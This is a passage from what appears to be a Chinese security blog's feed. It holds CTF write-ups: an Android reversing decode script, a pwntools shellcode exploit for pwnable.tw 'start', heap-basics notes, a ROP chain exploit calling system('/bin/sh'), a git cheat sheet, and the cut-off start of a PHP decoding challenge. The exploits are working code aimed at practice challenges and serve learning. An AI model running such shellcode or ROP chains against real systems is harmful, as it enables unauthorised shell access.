class="number">-76</span>, <span class="number">-104</span>, <span class="number">-123</span>, <span class="number">-71</span>, <span class="number">-126</span>, <span class="number">-62</span>, <span class="number">-23</span>, <span class="number">11</span>, <span class="number">-39</span>, <span class="number">70</span>, <span class="number">14</span>, <span class="number">59</span>, <span class="number">-101</span>, <span class="number">-39</span>, <span class="number">-124</span>, <span class="number">91</span>, <span class="number">-109</span>, <span class="number">102</span>, <span class="number">-49</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">0</span>, <span class="number">37</span>,<span class="number">-127</span>, <span class="number">-57</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">-115</span>, <span class="number">-86</span>, <span class="number">56</span>, <span class="number">25</span>, <span class="number">-46</span>, <span class="number">-55</span>, <span class="number">7</span>, <span class="number">-125</span>, <span class="number">109</span>, <span class="number">76</span>, <span class="number">104</span>, <span class="number">-15</span>, <span class="number">82</span>, <span class="number">-53</span>, <span class="number">18</span>, <span class="number">-28</span>, <span class="number">-24</span>]</span><br><span class="line"></span><br><span class="line">bArr = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(p))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(bArr)):</span><br><span class="line">    bArr[i] = p[i] ^ q[i]</span><br><span class="line">b = bArr[<span class="number">0</span>]</span><br><span class="line">i2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> bArr[b+i2] != <span class="number">0</span>:</span><br><span class="line">    i2 += <span class="number">1</span></span><br><span class="line">bArr2 = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,i2)]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,i2):</span><br><span class="line">    bArr2[j] = bArr[b+j]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> bArr2)</span><br><span class="line"></span><br><span class="line">flag:DDCTF<span class="number">-3</span>ad60811d87c4a2dba0ef651b2d93476@didichuxing.com</span><br></pre></td></tr></table></figure><h3 id="app2"><a href="#app2" class="headerlink" title="app2"></a>app2</h3><p><img src="/images/pasted-14.png" alt="upload successful"></p><h4 id="jadx"><a href="#jadx" class="headerlink" title="jadx"></a>jadx</h4><p><img src="/images/pasted-15.png" alt="upload successful"></p><blockquote><p>这题是有脑洞的，之前做过所以很快定位到了需要解密的字符串</p></blockquote><p><img src="/images/pasted-16.png" alt="upload successful"></p><p><img src="/images/pasted-17.png" alt="upload successful"></p><blockquote><p>AES_128_ECB_PKCS5Padding_Decrypt加密，密钥为thisisatestkey==</p></blockquote><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p><img src="/images/pasted-18.png" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>总体来说不算太难，除了最后第一是个坑之外，基本没涉及到so层的概念，是些入门很好的题目，感谢平台提供的练习机会</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-start</title>
      <link href="/pwnable-tw-start.html"/>
      <url>/pwnable-tw-start.html</url>
      
        <content type="html"><![CDATA[<h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p><img src="/images/pasted-0.png" alt="upload successful"></p><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/images/pasted-3.png" alt="upload successful"></p><h3 id="ida查看"><a href="#ida查看" class="headerlink" title="ida查看"></a>ida查看</h3><p><img src="/images/pasted-1.png" alt="upload successful"></p><blockquote><p>发现只有两个函数，_start 和 _exit ，看到int 80得知，此程序是通过系统调用的方式达到调用函数的目的</p></blockquote><p><img src="/images/pasted-2.png" alt="upload successful"></p><blockquote><p>gdb调试得知偏移为20</p></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">pro = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10000</span>)</span><br><span class="line">ret = <span class="number">0x8048087</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">shellcode = asm('\n'.join([</span></span><br><span class="line"><span class="string">    'push %d' % u32('/sh\0'),</span></span><br><span class="line"><span class="string">    'push %d' % u32('/bin'),</span></span><br><span class="line"><span class="string">    'xor edx, edx',</span></span><br><span class="line"><span class="string">    'xor ecx, ecx',</span></span><br><span class="line"><span class="string">    'mov ebx, esp',</span></span><br><span class="line"><span class="string">    'mov eax, 0xb',</span></span><br><span class="line"><span class="string">    'int 0x80',</span></span><br><span class="line"><span class="string">]))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">pro.readuntil(<span class="string">"CTF:"</span>)</span><br><span class="line">pro.send(<span class="string">'a'</span>*<span class="number">20</span> + p32(ret))</span><br><span class="line">shell_addr = u32(pro.recv()[:<span class="number">4</span>])</span><br><span class="line">pro.send(<span class="string">'A'</span>*<span class="number">20</span>+p32(shell_addr+<span class="number">20</span>)+shellcode)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap的学习(1)</title>
      <link href="/Heap%E7%9A%84%E5%AD%A6%E4%B9%A0-1.html"/>
      <url>/Heap%E7%9A%84%E5%AD%A6%E4%B9%A0-1.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>对于堆方面的内容，在没有别人帮助的情况下，学起来就很吃力，不像栈那么好理解，本篇记录我对堆的一些了解，不足之处，还望斧正。</p></blockquote><h3 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h3><blockquote><p>栈无法满足将函数内部的数据传递到函数的外部，虽然有全局变量可以传递，但是不能动态的产生，只能在编译的时候定义，在很多情况下显得鸡肋，这时候堆(Heap)就成了一种选择。堆是一个巨大的空间，常常占据着整个虚拟空间的绝大部分，在这片空间里，程序可以请求一块连续的内存并自由使用，直到程序主动放弃之前都会有效。</p></blockquote><h3 id="堆管理"><a href="#堆管理" class="headerlink" title="堆管理"></a>堆管理</h3><blockquote><p>程序向操作系统申请一块适当大小的堆空间，然后有程序自己管理这块空间，具体来讲，管理着堆空间分配的往往是程序的运行库，运行库相当于从系统批发了一块较大的堆空间，然后零售给程序用，当售完或程序有大量的内存需求时，在根据实际需求再次向系统申请进货，运行库通过堆的分配算法来管理程序的对空间。</p></blockquote><h4 id="Linux下提供两种堆空间分配的方式，及两个系统调用："><a href="#Linux下提供两种堆空间分配的方式，及两个系统调用：" class="headerlink" title="Linux下提供两种堆空间分配的方式，及两个系统调用："></a>Linux下提供两种堆空间分配的方式，及两个系统调用：</h4><h5 id="brk-系统调用"><a href="#brk-系统调用" class="headerlink" title="brk()  系统调用"></a>brk()  系统调用</h5><h6 id="brk-的c语言形式声明如下："><a href="#brk-的c语言形式声明如下：" class="headerlink" title="brk()的c语言形式声明如下："></a>brk()的c语言形式声明如下：</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">brk</span><span class="params">(<span class="keyword">void</span>* end_data_segment)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">实际作用就是设置进程数据段(Linux下将数据段和BSS段合在一起统称位数据段)的结束地址，及它可以扩大或缩小数据段，达到扩大或缩小堆空间的效果。</span><br><span class="line">glibc中还有一个函数交sbrk，它是对brk函数的封装，只不过参数和返回值略有不同，sbrk以一个增量(Increment)作为参数，及需要增加(负数为减少)的空间大小，返回值是增加或减少后数据段的结束地址</span><br></pre></td></tr></table></figure><h5 id="mmap-系统调用"><a href="#mmap-系统调用" class="headerlink" title="mmap() 系统调用"></a>mmap() 系统调用</h5><h6 id="mmap-的c语言形式声明如下："><a href="#mmap-的c语言形式声明如下：" class="headerlink" title="mmap()的c语言形式声明如下："></a>mmap()的c语言形式声明如下：</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">void</span> *start,      指定申请空间的起始地址，如果置为<span class="number">0</span>，那么Linux会自动挑选合适的起始地址</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">size_t</span> length,    指定申请空间的长度</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">int</span> prot,         申请空间的权限(可读，可写，可执行)</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">int</span> flags,        映射类型(文件映射、匿名空间)</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">int</span> fd,           用于文件映射时指定文件描述符</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">off_t</span> offset      用于文件映射时指定文件偏移</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line">作用就是向操作系统申请一段虚拟地址空间，当然这块虚拟地址空间可以映射到某个文件(这也是这个系统跳用最初的作用)，当他不将地址空间映射到某个文件时，称这段空间为匿名空间，匿名空间可以拿来当作堆空间。</span><br></pre></td></tr></table></figure><h3 id="堆结构"><a href="#堆结构" class="headerlink" title="堆结构"></a>堆结构</h3><p>这里可以参考<a href="https://www.anquanke.com/post/id/163971#h2-2" target="_blank" rel="noopener">CTF pwn 中最通俗易懂的堆入坑指南</a>，在看博客的时候产生一个疑问，为什么malloc(8)的值为0x21，后来自己写了程序，调试查看以及在网友的帮助下知道了原因。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">64</span>位系统</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">8</span>) 由于需要内存对齐，所以<span class="number">8</span>需要对齐到<span class="number">16</span>，然后加上pre size、size以及prev_inuse的值，也就是文中的<span class="number">16</span>+<span class="number">8</span>+<span class="number">8</span>+<span class="number">1</span>=<span class="number">0x21</span>的由来，但是当<span class="built_in">malloc</span>(<span class="number">24</span>)的时候，发现系统给的空间也是<span class="number">0x21</span>，这就又产生了疑问，不是应该为<span class="number">32</span>+<span class="number">8</span>+<span class="number">8</span>+<span class="number">1</span>=<span class="number">0x31</span>吗，后来询问网友得知，内存空间复用这个神奇的操作，也就是当前的堆会占用下一个堆的pre size(前提：下一个堆的前一个chunk是使用状态)，所以<span class="built_in">malloc</span>(<span class="number">24</span>) <span class="number">24</span>&lt;<span class="number">16</span>+<span class="number">8</span> 所以，还是会分配<span class="number">0x21</span>的空间给他</span><br></pre></td></tr></table></figure></p><p><img src="/images/6/1.png" alt="64位情况"></p><blockquote><p>32位和64位原理一样，只不过，对齐的到的大小不一样，64位对齐到16，32位对齐到8</p></blockquote><p><img src="/images/6/2.png" alt></p><blockquote><p>可以观察到，程序在第一次malloc之后会产生heap，并且大小是132kb，个人测试，32位也同样是132kb，往后，如果程序再malloc的时候就会从这里面申请，132kb的空间就是arena，由于是主线程分配的，所以也叫main arena</p></blockquote><p><img src="/images/6/3.png" alt></p><blockquote><p>top chunk的size会由于每次的malloc而减小</p></blockquote><h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><blockquote><p>将free掉的chunk放在不同的bin中</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fast bin</span><br><span class="line">small bin</span><br><span class="line">large bin</span><br><span class="line">unsorted bin</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>对于堆，总是感觉学了一遍，两遍，都不清楚到底是干嘛的，更加谈不上如何利用</p></blockquote><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>《程序员的自我修养》</p><p><a href="https://www.anquanke.com/post/id/163971#h2-2" target="_blank" rel="noopener">CTF pwn 中最通俗易懂的堆入坑指南</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN 学习—某平台ROP2 writeup</title>
      <link href="/PWN-%E5%AD%A6%E4%B9%A0%E2%80%94%E6%9F%90%E5%B9%B3%E5%8F%B0ROP2-writeup.html"/>
      <url>/PWN-%E5%AD%A6%E4%B9%A0%E2%80%94%E6%9F%90%E5%B9%B3%E5%8F%B0ROP2-writeup.html</url>
      
        <content type="html"><![CDATA[<h3 id="64位栈帧学习"><a href="#64位栈帧学习" class="headerlink" title="64位栈帧学习"></a>64位栈帧学习</h3><p><img src="/images/1/1.png" alt="在这里插入图片描述"></p><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><h4 id="本能反应"><a href="#本能反应" class="headerlink" title="本能反应"></a>本能反应</h4><p><img src="/images/1/2.png" alt="在这里插入图片描述"></p><blockquote><p>RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表<br>Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过<br>NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过<br>PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 </p></blockquote><h4 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h4><p><img src="/images/1/3.png" alt="在这里插入图片描述"></p><blockquote><p>发现输入一定的长度，程序就崩溃了</p></blockquote><h4 id="ida打开程序"><a href="#ida打开程序" class="headerlink" title="ida打开程序"></a>ida打开程序</h4><p><img src="/images/1/4.png" alt="在这里插入图片描述"></p><blockquote><p>查看要程序逻辑<br>发现存在栈溢出漏洞<br>输入长度大于 0xC (0x4 + 0x8) 面就是我们的天下了</p></blockquote><h5 id="查看函数表"><a href="#查看函数表" class="headerlink" title="查看函数表"></a>查看函数表</h5><p><img src="/images/1/5.png" alt="在这里插入图片描述"></p><h5 id="发现函数joke"><a href="#发现函数joke" class="headerlink" title="发现函数joke"></a>发现函数joke</h5><p><img src="/images/1/6.png" alt="在这里插入图片描述"></p><blockquote><p>似乎用不到的函数</p></blockquote><h5 id="接下来查看字符串"><a href="#接下来查看字符串" class="headerlink" title="接下来查看字符串"></a>接下来查看字符串</h5><p><img src="/images/1/7.png" alt="在这里插入图片描述"></p><blockquote><p>我无敌的/bin/sh字符串竟然没有，还好有gets和system函数</p></blockquote><h5 id="思考利用方法"><a href="#思考利用方法" class="headerlink" title="思考利用方法"></a>思考利用方法</h5><blockquote><p>调用gets函数像bss段写入/bin/sh，然后调用system函数执行system(“/bin/sh”);</p></blockquote><h5 id="实操过程"><a href="#实操过程" class="headerlink" title="实操过程"></a>实操过程</h5><p><img src="/images/1/8.png" alt="在这里插入图片描述"></p><blockquote><p>这里解释一下，由于gets函数只有一个参数，所以调用gets函数时，需要向rdi传入传入那个参数<br>pop rdi ; ret 的作用就是将当前栈顶的值存到rdi中<br>所以构造payload 为 p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)<br>程序执行到pop_rdi_ret时的栈顶就是bss的地址，然后就将bss地址存入rdi中，然后调用gets函数</p></blockquote><pre><code>接下来时调用system函数</code></pre><blockquote><p>我们知道，调用一个函数后，那个函数的下一个地址就会成为函数执行完后需要执行的第一个地方<br>我们在payload后面追加p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)，原理与gets函数相同，<br>gets往bss地址写入/bin/sh，system调用bss地址的/bin/sh，即达到了调用/bin/sh的作用</p></blockquote><h5 id="此时栈空间如图"><a href="#此时栈空间如图" class="headerlink" title="此时栈空间如图"></a>此时栈空间如图</h5><p><img src="/images/1/9.png" alt="在这里插入图片描述"></p><h5 id="附上payload"><a href="#附上payload" class="headerlink" title="附上payload"></a>附上payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pro = remote(<span class="string">"ip"</span>,port)</span><br><span class="line">pros = ELF(<span class="string">'./rop2'</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x6010F0</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008e3</span></span><br><span class="line"></span><br><span class="line">system_addr = pros.symbols[<span class="string">'system'</span>]</span><br><span class="line">gets_addr = pros.symbols[<span class="string">'gets'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> +<span class="string">'a'</span>*<span class="number">8</span> </span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)</span><br><span class="line">pro.readuntil(<span class="string">"~"</span>)</span><br><span class="line">pro.sendline(payload)</span><br><span class="line">pro.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/1/10.png" alt="在这里插入图片描述"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><pre><code>&gt; PWN 学习之路永无止境</code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> pwntools </tag>
            
            <tag> pwn </tag>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git学习小记</title>
      <link href="/git%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0.html"/>
      <url>/git%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、设置账户名和账户邮箱"><a href="#一、设置账户名和账户邮箱" class="headerlink" title="一、设置账户名和账户邮箱"></a>一、设置账户名和账户邮箱</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">"name"</span></span><br><span class="line">git config --global user.email <span class="string">"name@gmail.com</span></span><br><span class="line"><span class="string">git config --global http.proxy http://example.com:port</span></span><br></pre></td></tr></table></figure><h3 id="二、验证账户名和账户邮箱"><a href="#二、验证账户名和账户邮箱" class="headerlink" title="二、验证账户名和账户邮箱"></a>二、验证账户名和账户邮箱</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name</span><br><span class="line">git config --global user.email</span><br></pre></td></tr></table></figure><h3 id="三、初始化仓库"><a href="#三、初始化仓库" class="headerlink" title="三、初始化仓库"></a>三、初始化仓库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init 会生成 .git 文件夹，关于这个仓库的配置</span><br></pre></td></tr></table></figure><h3 id="四、添加文件及文件夹"><a href="#四、添加文件及文件夹" class="headerlink" title="四、添加文件及文件夹"></a>四、添加文件及文件夹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add name</span><br><span class="line"></span><br><span class="line">添加所有文件</span><br><span class="line">git add .</span><br></pre></td></tr></table></figure><h3 id="五、添加描述-必须添加"><a href="#五、添加描述-必须添加" class="headerlink" title="五、添加描述(必须添加)"></a>五、添加描述(必须添加)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">"hello world"</span></span><br></pre></td></tr></table></figure><h3 id="六、查看状态"><a href="#六、查看状态" class="headerlink" title="六、查看状态"></a>六、查看状态</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><h3 id="七、查看修改的文件"><a href="#七、查看修改的文件" class="headerlink" title="七、查看修改的文件"></a>七、查看修改的文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff -- filename</span><br></pre></td></tr></table></figure><h3 id="八、撤销修改"><a href="#八、撤销修改" class="headerlink" title="八、撤销修改"></a>八、撤销修改</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout filename</span><br></pre></td></tr></table></figure><h3 id="九、撤销修改-针对git-add提交之后的"><a href="#九、撤销修改-针对git-add提交之后的" class="headerlink" title="九、撤销修改(针对git add提交之后的)"></a>九、撤销修改(针对git add提交之后的)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset HEAD filename</span><br><span class="line">git checkout filename</span><br></pre></td></tr></table></figure><h3 id="十、查看提交记录"><a href="#十、查看提交记录" class="headerlink" title="十、查看提交记录"></a>十、查看提交记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br><span class="line">git <span class="built_in">log</span> logid -1 -p</span><br><span class="line">-1  表示只看到上面的一条记录</span><br><span class="line">-p 表示查看这条记录的所有信息</span><br></pre></td></tr></table></figure><h3 id="十一、上传文件"><a href="#十一、上传文件" class="headerlink" title="十一、上传文件"></a>十一、上传文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin github仓库地址</span><br><span class="line">如遇<span class="string">"fatal: remote origin already exists."</span>此问题</span><br><span class="line">输入 git remote rm origin</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><h3 id="十二、分支"><a href="#十二、分支" class="headerlink" title="十二、分支"></a>十二、分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">查看分支</span><br><span class="line">git branch</span><br><span class="line">当前分支前面会有一个*</span><br><span class="line">创建分支</span><br><span class="line">git branch version1.0</span><br><span class="line">切换分支</span><br><span class="line">git checkout version1.0</span><br><span class="line">将version1.0同步到当前分支</span><br><span class="line">git merge version1.0</span><br><span class="line">删除分支</span><br><span class="line">git branch -D version1.0</span><br><span class="line">克隆远程项目</span><br><span class="line">git <span class="built_in">clone</span> git@github.com:name/项目名.git</span><br><span class="line">将当前修改上传到服务器</span><br><span class="line">git push origin master</span><br><span class="line">将远程修改同步到本地</span><br><span class="line">git fetch origin master</span><br><span class="line">注：此方法不会将修改同步到当前分支，而是会同步到origin/master分支上，需要使用git merge origin/master同步到当前分支</span><br><span class="line">git pull origin master</span><br><span class="line">此方法是fetch和merge两者的合并</span><br></pre></td></tr></table></figure><h3 id="十三、其他"><a href="#十三、其他" class="headerlink" title="十三、其他"></a>十三、其他</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">创建密钥</span><br><span class="line">ssh-keygen -t rsa -C <span class="string">"name@gmail.com"</span></span><br><span class="line">将公钥添加到github</span><br><span class="line">cat .ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>attackworld-web2</title>
      <link href="/attackworld-web2.html"/>
      <url>/attackworld-web2.html</url>
      
        <content type="html"><![CDATA[<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$miwen=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123; </span><br><span class="line">    $_o=strrev($str); </span><br><span class="line">    <span class="comment">// echo $_o; </span></span><br><span class="line">         </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123; </span><br><span class="line">        </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>); </span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>; </span><br><span class="line">        $_c=chr($__); </span><br><span class="line">        $_=$_.$_c;    </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_))); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><blockquote><p>源码：反转字符-每位字符加一-base64-字符反转-rot13<br>解码：rot13-字符反转-base64-每位字符减一-字符反转</p></blockquote><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td 